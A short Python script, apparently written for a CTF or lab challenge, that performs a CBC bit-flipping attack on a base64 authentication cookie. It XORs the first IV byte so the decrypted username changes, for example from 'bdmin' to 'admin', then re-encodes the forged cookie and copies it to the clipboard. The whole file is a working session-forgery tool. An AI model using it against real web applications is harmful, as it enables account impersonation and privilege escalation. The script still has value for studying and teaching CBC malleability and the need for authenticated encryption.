import base64
import pyperclip

auth_cookie = ''
decoded_cookie = base64.b64decode(auth_cookie)

iv = bytearray(decoded_cookie[:8]) # recup les 8 premiers bits 
ciphertext = bytearray(decoded_cookie[8:]) # Recup le reste

current_char = ord(input("Enter the current letter you wan't to change ( ex : 'b' for user 'bdmin' ). Only works for the first letter !\n"))
target_char = ord(input("Enter the letter you want after the tampering ( ex 'a' to turn bdmin to admin )\n"))

iv[0] ^= current_char ^ target_char

modified_cookie = bytes(iv) + bytes(ciphertext)
modified_cookie_b64 = base64.b64encode(modified_cookie).decode()

print("Modified Cookie ( set to clipboard ) : ", modified_cookie_b64)
pyperclip.copy(modified_cookie_b64)
